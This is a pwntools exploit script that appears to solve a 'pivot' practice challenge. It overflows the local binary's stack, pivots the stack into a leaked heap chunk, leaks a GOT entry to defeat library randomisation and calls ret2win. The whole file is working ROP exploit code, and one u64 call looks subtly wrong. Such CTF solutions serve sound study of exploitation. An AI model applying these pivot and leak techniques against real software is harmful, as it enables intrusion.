#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

libpivot = ELF("./libpivot.so")

RIP_DIST = 40

POP_RDI = flat(0x0000000000400a33)
POP_RSP_R13_R14_R15 = flat(0x0000000000400a2d)
POP_RSI_R15 = flat(0x0000000000400a31)
POP_RAX = flat(0x00000000004009bb)
FILL_EDI_JMP_RAX = flat(0x00000000004007bc)

io = start()

pause()
io.readuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
leak = int(io.readline().strip().rjust(8, b'\0'), 16)
log.info(f"leak = {hex(leak)}")
log.info("sending rop chain")

io.readuntil(b'> ')
io.sendline(
            p64(0) + p64(0) + p64(0) + # this is r13/4/5 from the smash below
            flat(exe.symbols['plt.foothold_function']) + # populate the got
            POP_RDI + flat(exe.got['foothold_function']) +
            flat(exe.symbols['puts']) +
            POP_RAX + p64(leak + (8*9) ) +
            flat(exe.symbols['pwnme'] + 152)
            )


io.readuntil(b'> ')
io.sendline(cyclic(RIP_DIST) +
            POP_RSP_R13_R14_R15 + flat(leak) # pivot into the provided heap chunk
            )


io.readuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
foothold_leak = u64(io.readline().strip().ljust(8, b'\0'), 16)
log.info(f"foothold_function = {hex(foothold_leak)}")
libpivot_base = foothold_leak - libpivot.symbols['foothold_function']
log.info(f"libpivot base - {hex(libpivot_base)}")

log.info(f"sending stage 2 (ret2win)...")
io.sendline(flat(libpivot_base + libpivot.symbols['ret2win']))

io.interactive()

